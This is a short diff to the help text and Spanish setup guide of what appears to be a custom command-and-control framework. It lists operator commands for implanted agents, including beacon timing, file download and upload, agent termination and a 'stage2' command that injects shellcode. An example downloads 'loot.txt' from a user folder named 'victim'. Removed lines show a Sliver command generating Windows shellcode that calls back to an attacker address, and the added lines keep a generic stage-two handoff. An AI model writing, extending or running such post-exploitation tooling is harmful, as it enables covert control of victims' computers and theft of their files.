@@ -670,7 +670,7 @@ Session commands (require 'use <id>'):
   sleep <sec> <jitter_pct>         change beacon interval
   download <remote_path>           pull file from agent
   upload <local> <remote_path>     push file to agent  [TAB completes files]
-  stage2 <shellcode.bin>           inject shellcode (Sliver handoff)  [TAB completes files]
+  stage2 <shellcode.bin>           inject shellcode (stage2 handoff)  [TAB completes files]
   results [limit]                  show last N task results
   kill                             terminate agent
   back                             deselect agent
@@ -720,12 +720,10 @@ PASO 5 — Esperar conexión y operar
   c2 [abc12345]> download C:\Users\victim\loot.txt
   c2 [abc12345]> sleep 30 10
 
-PASO 6 — Handoff a Sliver (stage 2)
-  # En Sliver:
-  sliver > generate --http <IP_KALI>:8888 --format shellcode --os windows --arch amd64 --save /tmp/sliver.bin
-
+PASO 6 — Stage 2 handoff
+  # Genera shellcode con tu framework secundario y guárdalo en disco.
   # En c2:
-  c2 [abc12345]> stage2 /tmp/sliver.bin
+  c2 [abc12345]> stage2 /tmp/stage2.bin
 
 NOTAS:
   · Listeners HTTP (:8080) y mTLS (:8443) arrancan automáticamente
